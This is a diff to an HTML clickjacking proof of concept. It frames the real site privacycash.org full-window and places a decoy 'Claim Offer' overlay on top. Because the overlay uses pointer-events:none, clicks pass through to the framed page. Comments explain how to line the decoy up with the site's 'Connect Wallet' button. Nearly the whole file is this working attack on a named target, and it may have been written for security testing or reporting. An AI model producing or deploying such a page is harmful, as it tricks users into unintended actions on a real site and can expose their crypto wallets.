@@ -1,11 +1,67 @@
 <!doctype html>
 <html>
-<head><meta charset="utf-8"><title>Clickjacking POC</title>
-<style>body,html{height:100%;margin:0}iframe{position:absolute;left:0;top:0;width:100vw;height:100vh;border:none}#fake-ui{position:absolute;right:20px;bottom:20px;z-index:9999;background:rgba(0,0,0,0.8);color:#fff;padding:12px;border-radius:8px;font-family:sans-serif}</style>
+<head>
+  <meta charset="utf-8">
+  <title>Clickjacking POC (align & passthrough)</title>
+  <style>
+    html,body {height:100%; margin:0;}
+    /* iframe is full window */
+    iframe {
+      position:absolute;
+      left:0; top:0;
+      width:100vw; height:100vh;
+      border:0;
+      z-index:0;
+    }
+
+    /* Visual overlay: appears clickable, but DOES NOT capture pointer events.
+       Adjust top/left to line it up with the Connect Wallet button on the framed page. */
+    #fake-ui {
+      position:absolute;
+      /* example coordinates — change these to match Connect Wallet on your screen */
+      top: 74vh;      /* try percentages first */
+      left: 78vw;
+      transform: translate(-50%, -50%);
+      z-index: 2;
+      background: rgba(0,0,0,0.25); /* semi-transparent visual only */
+      color: white;
+      padding: 12px 14px;
+      border-radius: 8px;
+      font-family: sans-serif;
+      pointer-events: none; /* <-- critical: allow clicks to pass through to iframe */
+    }
+
+    /* If you want a clear "button" look while still letting clicks pass */
+    #fake-ui .btn {
+      display:inline-block;
+      padding:8px 12px;
+      background: rgba(255,255,255,0.06);
+      border-radius:6px;
+      pointer-events: none; /* keep children non-interactive */
+    }
+
+    /* Optional: a visible indicator near the overlay that *does* accept clicks
+       (for demo only) — position it away from the overlay so it doesn't intercept the iframe click */
+    #control {
+      position: absolute;
+      bottom: 20px;
+      left: 20px;
+      z-index: 3;
+    }
+  </style>
 </head>
 <body>
-<iframe src="https://privacycash.org/" id="target"></iframe>
-<div id="fake-ui"><p>Click for a special offer</p><button id="bait">Claim Offer</button></div>
-<script>document.getElementById('bait').addEventListener('click',()=>alert('Offer claimed!'))</script>
+  <iframe src="https://privacycash.org/" id="target"></iframe>
+
+  <!-- This is the fake UI that *looks* clickable but does not block clicks -->
+  <div id="fake-ui" aria-hidden="true">
+    <div>Click for a special offer</div>
+    <div class="btn">Claim Offer</div>
+  </div>
+
+  <!-- A real control you can click that won't interfere with the overlay alignment -->
+  <div id="control">
+    <button onclick="alert('This is a local control — does not affect the iframe')">Test local button</button>
+  </div>
 </body>
 </html>
